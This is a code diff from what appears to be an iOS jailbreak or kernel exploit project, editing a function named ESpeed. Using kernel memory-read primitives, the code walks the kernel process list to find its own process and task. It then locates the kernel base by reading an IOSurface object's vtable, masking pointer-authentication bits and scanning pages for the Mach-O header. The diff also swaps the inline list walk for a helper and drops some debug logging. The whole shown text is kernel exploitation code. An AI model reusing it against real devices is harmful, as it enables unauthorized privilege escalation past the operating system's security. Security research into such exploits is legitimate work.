@@ -60,20 +60,7 @@ mach_port_t ESpeed(void) {
     
     // took this from oob_timestamp x2
     uint64_t kproc = rk64(kernel_all_image_info_addr + offsetof(struct kernel_all_image_info_addr, kernproc));
-    uint64_t proclist = kproc;
-    if(!ADDRISVALID(kproc)) {
-        LOG("[ESpeed] ERR: Couldn't grab kernproc from struct");
-        return 1;
-    }
-    for(;;) {
-        if(proclist == 0 || proclist == -1) break;
-        UInt32 procpid = rk32(proclist + koffset(KSTRUCT_OFFSET_PROC_PID));
-        if(procpid == mypid) {
-            selfproc = proclist;
-            break;
-        }
-        proclist = rk64(proclist + 0x8);
-    }
+    selfproc = find_proc_by_kernel(getpid(), kproc);
     selftask = rk64(selfproc + 0x10);
     LOG("[ESpeed] Found our task: 0x%llx", selftask);
     
@@ -113,7 +100,7 @@ mach_port_t ESpeed(void) {
     KernelBase = rk64(kernel_all_image_info_addr +
     offsetof(struct kernel_all_image_info_addr, kernel_base_address));
     if(!ADDRISVALID(KernelBase) || KernelBase == 0) { // this shouldn't happen
-        LOG("[ESpeed] ERR: Couldn't grab KernelBase from struct");
+        LOG("[ESpeed] ?: Couldn't grab KernelBase from struct");
         
         // try using the timewaste method
         int init = init_IOSurface();
@@ -135,12 +122,9 @@ mach_port_t ESpeed(void) {
         uint64_t IOSurface_object = rk64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
          uint64_t vtable = rk64(IOSurface_object);
          vtable |= 0xffffff8000000000; // in case it has PAC
-        LOG("[ESpeed] vtable: 0x%llx", vtable);
          uint64_t function = rk64(vtable + 8 * koffset(OFFSET_GETFI));
          function |= 0xffffff8000000000; // this address is inside the kernel image
-        LOG("[ESpeed] function in kernel image: 0x%llx", function);
          uint64_t page = trunc_page_kernel(function);
-        LOG("[ESpeed] kernel page: 0x%llx", page);
          while (true) {
              if (rk64(page) == 0x0100000cfeedfacf && (rk64(page + 8) == 0x0000000200000000 || rk64(page + 8) == 0x0000000200000002)) {
                  KernelBase = page;
